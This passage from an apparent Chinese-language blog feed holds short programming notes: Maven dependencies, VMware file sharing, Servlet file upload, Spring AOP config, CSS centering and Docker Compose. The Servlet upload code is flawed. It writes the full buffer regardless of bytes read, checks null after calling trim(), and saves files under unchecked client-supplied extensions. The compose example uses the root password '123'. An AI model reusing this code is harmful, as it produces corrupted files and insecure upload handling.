class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--spring连接数据库--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--aop支持--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--整合spring和mybatis--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.mybatis/mybatis-spring --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--用于测试--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.13.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="maven导入静态资源"><a href="#maven导入静态资源" class="headerlink" title="maven导入静态资源"></a>maven导入静态资源</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>false<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>false<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>配置模板</tag>
        <tag>SSM</tag>
        <tag>maven依赖包</tag>
        <tag>maven导入资源</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware中的虚拟机与宿主机的文件共享</title>
    <url>/2021/06/10/VMware%E4%B8%AD%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8E%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB/</url>
    <content><![CDATA[<h2 id="简要说明"><a href="#简要说明" class="headerlink" title="简要说明"></a>简要说明</h2><span id="more"></span>

<h3 id="目前我知道的有如下几种方法"><a href="#目前我知道的有如下几种方法" class="headerlink" title="目前我知道的有如下几种方法"></a>目前我知道的有如下几种方法</h3><ol>
<li>使用VMware Tools（这种方法功能很多，具体见下图，但由于本人尝试过很次，总是出现一些问题，所以本文暂不对此方法进行说明，等以后空闲时间在尝试摸索一番）</li>
<li>使用U盘（此方法较为简单，只是需要借助一个U盘）</li>
<li>建立共享文件夹（此方法也很简单，不需要借助其它设备，也不需要下载其他软件、插件）</li>
</ol>
<h2 id="建立共享文件夹——方法阐述"><a href="#建立共享文件夹——方法阐述" class="headerlink" title="建立共享文件夹——方法阐述"></a>建立共享文件夹——方法阐述</h2><h3 id="步骤解析（来一波图片！）"><a href="#步骤解析（来一波图片！）" class="headerlink" title="步骤解析（来一波图片！）"></a>步骤解析（来一波图片！）</h3><p><img src="https://i.loli.net/2021/06/10/xBfFhSciIqE3QuC.png" alt="屏幕截图 2021-06-10 232743.png"></p>
<p><img src="https://i.loli.net/2021/06/10/8zA1hcRYtsSlqkX.png" alt="屏幕截图 2021-06-10 232628.png"></p>
<p>下面这张图里选择的文件夹可以自己新建一个，比如就命名为“虚拟机共享文件夹”</p>
<p><img src="https://i.loli.net/2021/06/10/avGApILn6HzRd5T.png" alt="屏幕截图 2021-06-10 232931.png"><br><img src="https://i.loli.net/2021/06/10/HPwhbdTkRf1XGVK.png" alt="屏幕截图 2021-06-10 233006.png"></p>
<p>下面这张图里，根据个人所需设置，后期可以随时修改</p>
<p><img src="https://i.loli.net/2021/06/10/KSz2lj5fxg1OYGQ.png" alt="屏幕截图 2021-06-10 233033.png"></p>
<h3 id="虚拟机查看路径"><a href="#虚拟机查看路径" class="headerlink" title="虚拟机查看路径"></a>虚拟机查看路径</h3><p>在虚拟机里默认保存的地点路径如下：（再来一波图！）<br><img src="https://i.loli.net/2021/06/10/OBQWMaYqED7esdn.png" alt="屏幕截图 2021-06-10 233146.png"><br><img src="https://i.loli.net/2021/06/10/lf6HQ5ZSW7obnm2.png" alt="屏幕截图 2021-06-10 233212.png"><br><img src="https://i.loli.net/2021/06/10/tsArNLxDKh8vm7I.png" alt="屏幕截图 2021-06-10 233231.png"><br><img src="https://i.loli.net/2021/06/10/AijaIbQu5tCVLYk.png" alt="屏幕截图 2021-06-10 233246.png"></p>
<p><strong>共享的文件夹的路径是：/mnt/hgfs</strong></p>
<p>好了，下面虚拟机和宿主机就可以通过这个文件夹进行信息、文件等交流啦！</p>
]]></content>
  </entry>
  <entry>
    <title>Servlet文件上传</title>
    <url>/2021/10/23/Servlet%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h2 id="Servlet实现文件上传"><a href="#Servlet实现文件上传" class="headerlink" title="Servlet实现文件上传"></a>Servlet实现文件上传</h2><span id="more"></span>

<p>由于步骤相对比较固定，所以本文只记录核心步骤，其他步骤一般可以想出来，想不出来去翻这一篇博客：<a href="https://www.cnblogs.com/th11/p/15102759.html">servlet-文件上传-狂神笔记 - 你我不在年少 - 博客园 (cnblogs.com)</a></p>
<p><img src="https://i.loli.net/2021/10/23/vRdYaOitK4ADVuP.png" alt="Servlet实现文件上传.drawio"></p>
<h3 id="步骤一：导入包"><a href="#步骤一：导入包" class="headerlink" title="步骤一：导入包"></a>步骤一：导入包</h3><p>①commons-io依赖</p>
<p>②commons-fileupload依赖</p>
<p><img src="https://i.loli.net/2021/10/23/GNUp3yojSxtHuez.png" alt="image-20211023120138825"></p>
<h3 id="步骤二：获取DiskFileItemFactory对象"><a href="#步骤二：获取DiskFileItemFactory对象" class="headerlink" title="步骤二：获取DiskFileItemFactory对象"></a>步骤二：获取DiskFileItemFactory对象</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取DiskFileItemFactory对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> tempfile 文件临时存储路径</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> DiskFileItemFactory <span class="title">getDiskFileItemFactory</span><span class="params">(File tempfile)</span> </span>&#123;</span><br><span class="line">    DiskFileItemFactory factory = <span class="keyword">new</span> DiskFileItemFactory();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//文件大于2M，由内存转存到临时文件中</span></span><br><span class="line">    factory.setSizeThreshold(<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">2</span>);</span><br><span class="line">    <span class="comment">//临时文件存储路径</span></span><br><span class="line">    factory.setRepository(tempfile);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> factory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="步骤三：获取ServletFileUpload对象"><a href="#步骤三：获取ServletFileUpload对象" class="headerlink" title="步骤三：获取ServletFileUpload对象"></a>步骤三：获取ServletFileUpload对象</h3><p><strong>构造方法中可以传入步骤二中获取到的DiskFileItemFactory对象</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 获取ServletFileUpload对象</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> factory</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ServletFileUpload <span class="title">getServletFileUpload</span><span class="params">(DiskFileItemFactory factory)</span> </span>&#123;</span><br><span class="line">    ServletFileUpload upload = <span class="keyword">new</span> ServletFileUpload(factory);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//读取单个部分标题时，设置编码格式</span></span><br><span class="line">    upload.setHeaderEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">    <span class="comment">//单个文件最大20M</span></span><br><span class="line">    upload.setFileSizeMax(<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">100</span>);</span><br><span class="line">    <span class="comment">//最多上传20M</span></span><br><span class="line">    upload.setSizeMax(<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//监听上传进程</span></span><br><span class="line">    upload.setProgressListener(<span class="keyword">new</span> ProgressListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">long</span> pBytesRead, <span class="keyword">long</span> pContentLength, <span class="keyword">int</span> pItems)</span> </span>&#123;</span><br><span class="line">            <span class="comment">//计算百分比</span></span><br><span class="line">            <span class="comment">//                double percentResult = (pBytesRead / (double) pContentLength);</span></span><br><span class="line">            System.out.println(<span class="string">&quot;总大小：&quot;</span> + pContentLength + <span class="string">&quot;    已上传&quot;</span> + pBytesRead);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> upload;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="步骤三：解析请求，获取文件，返回结果"><a href="#步骤三：解析请求，获取文件，返回结果" class="headerlink" title="步骤三：解析请求，获取文件，返回结果"></a>步骤三：解析请求，获取文件，返回结果</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//解析请求并返回结果</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">parseUploadRequest</span><span class="params">(HttpServletRequest request, ServletFileUpload upload, String uploadPath)</span> <span class="keyword">throws</span> FileUploadException, IOException </span>&#123;</span><br><span class="line">    List&lt;FileItem&gt; fileItems = upload.parseRequest(request);</span><br><span class="line">    String msg = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (FileItem fileItem : fileItems) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fileItem.isFormField()) &#123;</span><br><span class="line">            <span class="comment">//如果是简单的表单字段，返回true；如果代表上传的文件，返回false</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (fileItem.getName().trim().equals(<span class="string">&quot;&quot;</span>) || fileItem.getName() == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//文件名不合乎规则</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//文件名</span></span><br><span class="line">                String uploadFileName = fileItem.getName();</span><br><span class="line">                System.out.println(<span class="string">&quot;uploadFileName&quot;</span> + uploadFileName);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//一般uploadFileName是单纯的文件名，但有些浏览器也会把路径给带上去，所以这里要再过滤一下</span></span><br><span class="line">                <span class="comment">//lastindexof找不到返回-1</span></span><br><span class="line">                <span class="comment">//substring从下标0开始</span></span><br><span class="line">                String fileName = uploadFileName.substring(uploadFileName.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;fileName:&quot;</span> + fileName);</span><br><span class="line">                <span class="comment">//后缀名</span></span><br><span class="line">                String fileExtName = uploadFileName.substring(uploadFileName.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;fileExtName:&quot;</span> + fileExtName);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//输出到服务器上</span></span><br><span class="line">                <span class="comment">//可能需要用到UUID</span></span><br><span class="line">                InputStream inputStream = fileItem.getInputStream();</span><br><span class="line">                <span class="comment">//                FileOutputStream fos = new FileOutputStream(uploadPath + &quot;/&quot; + fileName + &quot;.&quot; + fileExtName);</span></span><br><span class="line">                <span class="comment">//使用UUID确保文件名唯一性</span></span><br><span class="line">                String uuidStirng = UUID.randomUUID().toString();</span><br><span class="line">                FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(uploadPath + <span class="string">&quot;/&quot;</span> + uuidStirng + <span class="string">&quot;.&quot;</span> + fileExtName);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span> * <span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (inputStream.read(buffer) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    fos.write(buffer);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                fos.flush();</span><br><span class="line">                fos.close();</span><br><span class="line"></span><br><span class="line">                inputStream.close();</span><br><span class="line">                msg = <span class="string">&quot;文件上传成功&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        fileItem.delete();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> msg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>步骤相对固定。但其中还会有些许其他小技巧，如：获取文件名、借助UUID编号保持文件名唯一性。</p>
]]></content>
      <tags>
        <tag>Servlet</tag>
        <tag>文件上传</tag>
        <tag>UUID</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring的核心配置模板</title>
    <url>/2021/11/06/Spring%E7%9A%84%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<h2 id="Spring的application-xml配置模板"><a href="#Spring的application-xml配置模板" class="headerlink" title="Spring的application.xml配置模板"></a>Spring的application.xml配置模板</h2><span id="more"></span>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">&quot;http://www.springframework.org/schema/aop&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">                           https://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">                           http://www.springframework.org/schema/aop</span></span></span><br><span class="line"><span class="tag"><span class="string">                           https://www.springframework.org/schema/aop/spring-aop.xsd </span></span></span><br><span class="line"><span class="tag"><span class="string">                           http://www.springframework.org/schema/context </span></span></span><br><span class="line"><span class="tag"><span class="string">                           https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--指定注解扫描包--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.lry.pojo&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--开启属性注解支持--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--aop的注解支持--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--注册Bean--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;diy&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.lry.diy.DiyPointCut&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.lry.service.UserServiceImpl&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--第一种方式：通过Spring API实现--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--aop的配置--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--切入点：expression：表达式匹配要拦截的方法：--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        execution(modifiers-pattern? ret-type-pattern declaring-type-pattern?name-pattern(param-pattern) throws-pattern?)</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;pointcut&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* com.lry.service.UserServiceImpl.*(..))&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--执行环绕; advice-ref执行方法 . pointcut-ref切入点--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;beforeLog&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointcut&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;afterLog&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointcut&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--第二种方式：自定义类来实现AOP--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--aop的配置--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">&quot;diy&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;pointCut&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* com.lry.service.UserServiceImpl.*(..))&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:before</span> <span class="attr">method</span>=<span class="string">&quot;before&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointCut&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:after</span> <span class="attr">method</span>=<span class="string">&quot;after&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointCut&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>配置模板</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Win10+Ubuntu双系统安装教程</title>
    <url>/2022/01/08/Win10-Ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="双系统安装教程"><a href="#双系统安装教程" class="headerlink" title="双系统安装教程"></a>双系统安装教程</h2><span id="more"></span>

<p><strong>链接：<a href="https://pan.baidu.com/s/196WaNTewLsoKamzcz_CI3w">https://pan.baidu.com/s/196WaNTewLsoKamzcz_CI3w</a></strong><br><strong>提取码：1111</strong></p>
]]></content>
      <tags>
        <tag>双系统</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>cmd临时修改编码格式</title>
    <url>/2021/10/16/cmd%E4%B8%B4%E6%97%B6%E4%BF%AE%E6%94%B9%E7%BC%96%E7%A0%81%E6%A0%BC%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="CMD中修改编码格式"><a href="#CMD中修改编码格式" class="headerlink" title="CMD中修改编码格式"></a>CMD中修改编码格式</h2><span id="more"></span>

<p>在cmd中有时候需要以<strong>utf-8</strong>的编码格式显示数据</p>
<p>在打开的cmd中执行下面语句，即可以<strong>utf-8</strong>格式显示数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chcp 65001 </span><br></pre></td></tr></table></figure>

<p><strong>该语句仅在当前的cmd窗口中生效，重新打开cmd窗口后会恢复原来默认的GBK编码格式</strong></p>
<p>执行前：</p>
<p><img src="https://i.loli.net/2021/10/16/D3ENjtXdi6qIxBY.png" alt="image-20211016164131038"></p>
<p>执行后效果：</p>
<p><img src="https://i.loli.net/2021/10/16/UGw4cMdOmCuyEhn.png" alt="image-20211016164227381"></p>
]]></content>
      <tags>
        <tag>cmd编码格式</tag>
      </tags>
  </entry>
  <entry>
    <title>css设置div垂直水平居中</title>
    <url>/2021/12/23/css%E8%AE%BE%E7%BD%AEdiv%E5%9E%82%E7%9B%B4%E6%B0%B4%E5%B9%B3%E5%B1%85%E4%B8%AD/</url>
    <content><![CDATA[<h2 id="CSS设置div垂直水平居中"><a href="#CSS设置div垂直水平居中" class="headerlink" title="CSS设置div垂直水平居中"></a>CSS设置div垂直水平居中</h2><span id="more"></span>

<p><strong>第一种：</strong></p>
<p>position: absolute;<br>margin:auto;<br>top: 0;<br>left: 0;<br>right: 0;<br>bottom: 0；</p>
<hr>
<p><strong>第二种：</strong></p>
<p>position:absolute;<br>top:50%;<br>left:50%;<br>transform: translate(-50%,-50%);//通过变形来搞定</p>
<hr>
<p><strong>第三种：</strong></p>
<p>display: flex;<br>flex-direction: column;//column、row定义项目的排列方向<br>justify-content: center;<br>align-items: center;</p>
<hr>
<p><strong>第四种：</strong></p>
<p>position:absolute;<br>left:0;<br>top: 0;<br>bottom: 0;<br>right: 0;<br>margin: auto;</p>
]]></content>
      <tags>
        <tag>前端</tag>
        <tag>CSS样式</tag>
      </tags>
  </entry>
  <entry>
    <title>cuda+cudnn+pytorch安装教程</title>
    <url>/2023/11/05/cuda-cudnn-pytorch%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="安装Cuda和Pytorch"><a href="#安装Cuda和Pytorch" class="headerlink" title="安装Cuda和Pytorch"></a>安装Cuda和Pytorch</h2><span id="more"></span>

<p>1.查看自己的nvidia驱动对cuda的最高支持的版本（通过nvidia-smi查看）<br>2.安装该cuda版本（通过nvcc -V和环境变量检查）<br>3.安装cudnn对应该cuda版本的版本<br>4.安装适配该cuda+python+系统版本的pytorch版本（可以去官网或者<a href="https://download.pytorch.org/whl/torch_stable.html%E4%B8%8B%E8%BD%BD%E8%BD%AE%E5%AD%90%E5%88%B0%E6%9C%AC%E5%9C%B0%E5%86%8D%E5%AE%89%E8%A3%85%EF%BC%89">https://download.pytorch.org/whl/torch_stable.html下载轮子到本地再安装）</a></p>
]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>docker部署项目-DockerCompose一键部署</title>
    <url>/2024/07/13/docker%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2-DockerCompose%E4%B8%80%E9%94%AE%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<h2 id="DockerCompose一键部署"><a href="#DockerCompose一键部署" class="headerlink" title="DockerCompose一键部署"></a>DockerCompose一键部署</h2><span id="more"></span>

<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><blockquote>
<p> Docker Compose通过一个单独的<strong>docker-compose.yml</strong>模板文件，定义一组关联的应用容器，实现<strong>多个相互关联的Docker容器的快速部署</strong>。</p>
</blockquote>
<h3 id="docker-compose-yml文件"><a href="#docker-compose-yml文件" class="headerlink" title="docker-compose.yml文件"></a>docker-compose.yml文件</h3><p><strong>示例</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&quot;3.8&quot;</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  mysql:				<span class="comment"># mysql服务，在本docker-conpose.yml文件中定义的服务名（可用于后面的服务依赖，控制服务的启动顺序）</span></span><br><span class="line">    image: mysql		<span class="comment"># 使用的镜像名</span></span><br><span class="line">    container_name: mysql	<span class="comment"># 创建的容器名</span></span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;3306:3306&quot;</span>		<span class="comment"># 绑定端口</span></span><br><span class="line">    environment:		<span class="comment"># 该容器本身使用的环境变量</span></span><br><span class="line">      TZ: Asia/Shanghai</span><br><span class="line">      MYSQL_ROOT_PASSWORD: 123</span><br><span class="line">    volumes:			<span class="comment"># 该容器挂载的数据卷</span></span><br><span class="line">      - <span class="string">&quot;./mysql/conf:/etc/mysql/conf.d&quot;</span></span><br><span class="line">      - <span class="string">&quot;./mysql/data:/var/lib/mysql&quot;</span></span><br><span class="line">      - <span class="string">&quot;./mysql/init:/docker-entrypoint-initdb.d&quot;</span></span><br><span class="line">    networks:			<span class="comment"># 连接到的网络，以便同一网络下的容器可通过容器名互ping</span></span><br><span class="line">      - hm-net</span><br><span class="line">  hmall:				<span class="comment"># hmall服务</span></span><br><span class="line">    build:				<span class="comment"># 